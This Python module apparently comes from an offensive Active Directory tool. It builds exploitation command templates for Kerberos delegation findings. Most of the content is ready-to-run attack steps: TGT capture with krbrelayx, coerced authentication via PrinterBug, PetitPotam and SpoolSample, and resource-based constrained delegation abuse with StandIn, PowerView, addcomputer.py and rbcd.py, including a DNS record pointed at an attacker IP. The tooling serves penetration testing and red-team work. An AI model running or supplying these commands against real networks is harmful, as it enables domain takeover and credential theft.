"""Other tool command templates: PowerView, StandIn, SpoolSample, krbrelayx."""

from __future__ import annotations

from typing import TYPE_CHECKING

if TYPE_CHECKING:
    from sharpgate.analyser.models import DelegationFinding


def unconstrained_krbrelayx(finding: DelegationFinding) -> list[dict]:
    """krbrelayx-based unconstrained delegation exploitation (Linux)."""
    domain = finding.domain.lower()
    target = finding.samaccountname

    return [
        {
            "step": 1,
            "title": f"Add DNS record for {target} (if needed)",
            "command": (
                f"dnstool.py -u '{domain}\\USER' -p 'PASSWORD' "
                f"-r {target}.{domain} -a add -d <ATTACKER-IP> <DC-IP>"
            ),
            "notes": [
                "Only needed if you don't have DNS control.",
                "krbrelayx needs the target hostname to resolve to your IP.",
            ],
        },
        {
            "step": 2,
            "title": "Start krbrelayx listener",
            "command": (
                f"krbrelayx.py -aesKey <{target}_AES256_KEY> --dc-ip <DC-IP>"
            ),
            "notes": [
                "Listens for Kerberos authentication and captures TGTs.",
                "The AES key must be from the unconstrained delegation account.",
            ],
        },
        {
            "step": 3,
            "title": "Coerce authentication (PrinterBug)",
            "command": (
                f"printerbug.py '{domain}/USER:PASSWORD'@<DC-IP> "
                f"{target}.{domain}"
            ),
        },
        {
            "step": 4,
            "title": "Coerce authentication (PetitPotam alternative)",
            "command": (
                f"PetitPotam.py -d {domain} -u 'USER' -p 'PASSWORD' "
                f"{target}.{domain} <DC-IP>"
            ),
        },
    ]


def unconstrained_spoolsample(finding: DelegationFinding) -> list[dict]:
    """SpoolSample-based coercion (Windows)."""
    target = finding.samaccountname

    return [
        {
            "step": 1,
            "title": "Coerce DC authentication via SpoolSample",
            "prereq": f"Session on {target}",
            "command": (
                f"SpoolSample.exe <DC-HOSTNAME> {target}"
            ),
            "notes": [
                "Triggers the PrinterBug (MS-RPRN) from a Windows host.",
                f"The DC will authenticate back to {target}.",
                "Combine with Rubeus monitor to capture the TGT.",
            ],
        },
    ]


def rbcd_setup_powerview(finding: DelegationFinding) -> list[dict]:
    """RBCD setup attack using PowerView/StandIn (Windows)."""
    domain = finding.domain.lower()
    target = finding.samaccountname

    return [
        {
            "step": 1,
            "title": "Create a machine account with StandIn",
            "prereq": "MachineAccountQuota > 0",
            "command": (
                "StandIn.exe --computer YOURPC --make"
            ),
            "notes": [
                "Creates a new machine account with a random password.",
                "Note the password/hash for later S4U.",
            ],
        },
        {
            "step": 2,
            "title": f"Set RBCD on {target} with PowerView",
            "prereq": f"Write access to {target}",
            "command": (
                f"Set-DomainObject -Identity '{target}' "
                f"-Set @{{'msDS-AllowedToActOnBehalfOfOtherIdentity'="
                f"(New-Object Security.AccessControl.RawSecurityDescriptor("
                f"'O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;'+"
                f"(Get-DomainComputer 'YOURPC$').objectSid+')'))"
                f".GetBinaryForm(0,$b=$null;$b)}}"
            ),
            "notes": [
                "PowerShell with PowerView imported.",
                "Sets the RBCD attribute to allow YOURPC$ to delegate.",
                "Alternative: Use StandIn --delegation --sid <SID>.",
            ],
        },
        {
            "step": 3,
            "title": f"Set RBCD with StandIn (alternative)",
            "command": (
                f"StandIn.exe --computer {target} --sid <YOURPC_SID>"
            ),
        },
        {
            "step": 4,
            "title": "Cleanup",
            "command": (
                f"Set-DomainObject -Identity '{target}' -Clear "
                f"'msDS-AllowedToActOnBehalfOfOtherIdentity'"
            ),
            "notes": [
                "Remove the RBCD entry after testing.",
            ],
        },
    ]


def rbcd_setup_linux(finding: DelegationFinding) -> list[dict]:
    """RBCD setup attack: addcomputer + rbcd.py (Linux)."""
    domain = finding.domain.lower()
    target = finding.samaccountname

    return [
        {
            "step": 1,
            "title": "Add machine account",
            "command": (
                f"addcomputer.py -computer-name 'YOURPC$' -computer-pass 'Password1' "
                f"'{domain}/USER:PASSWORD' -dc-ip <DC-IP>"
            ),
        },
        {
            "step": 2,
            "title": f"Configure RBCD on {target}",
            "prereq": f"Write access to {target}",
            "command": (
                f"rbcd.py -delegate-from 'YOURPC$' -delegate-to '{target}' "
                f"-action write '{domain}/USER:PASSWORD' -dc-ip <DC-IP>"
            ),
        },
        {
            "step": 3,
            "title": "Cleanup",
            "command": (
                f"rbcd.py -delegate-from 'YOURPC$' -delegate-to '{target}' "
                f"-action remove '{domain}/USER:PASSWORD' -dc-ip <DC-IP>"
            ),
        },
    ]


OTHER_COMMANDS = {
    "unconstrained_krbrelayx": unconstrained_krbrelayx,
    "unconstrained_spoolsample": unconstrained_spoolsample,
    "rbcd_setup_powerview": rbcd_setup_powerview,
    "rbcd_setup_linux": rbcd_setup_linux,
}
